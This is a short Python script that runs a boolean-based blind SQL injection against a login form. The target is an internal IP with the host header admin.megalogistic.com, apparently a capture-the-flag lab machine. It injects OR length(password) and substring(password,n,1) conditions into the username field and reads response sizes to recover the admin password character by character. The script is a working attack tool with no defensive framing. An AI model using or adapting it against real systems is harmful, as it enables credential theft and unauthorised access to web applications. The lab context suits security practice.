#!/usr/bin/env python3

import string
from urllib import request, parse
import ssl


url = "http://10.10.10.236"
chars = string.printable
headers = {"Content-Type":"application/x-www-form-urlencoded", "Host":"admin.megalogistic.com"}
proxy = {"http":"http://localhost:8080"}
context = ssl._create_unverified_context()
passw = []

for i in range(1,100):
    sql = f"admins'+OR+length(password)%3d{i}+--+-"
    data = f"username={sql}&password".encode()
    req = request.Request(url, headers=headers, data=data)
    req.set_proxy("http://localhost:8080", "http")
    resp = request.urlopen(req)#, context=context)
    if len(resp.read()) != 916:
        length = i
        print(f"Got password length: {length}!")
        break
    else:
        continue

for n in range(1, length+1):
    for c in chars:
        sql = f"admins'+OR+substring(password,{n},1)%3d'{c}'+--+-"
        data = f"username={sql}&password".encode()
        req = request.Request(url, headers=headers, data=data)
        req.set_proxy("http://localhost:8080", "http")
        resp = request.urlopen(req)#, context=context)
        if len(resp.read()) != 916:
            passw += c
            passw = ''.join(passw)
            print(f"Password: {passw}",end="\r")

print("\n")
print(f"Password: {passw}")
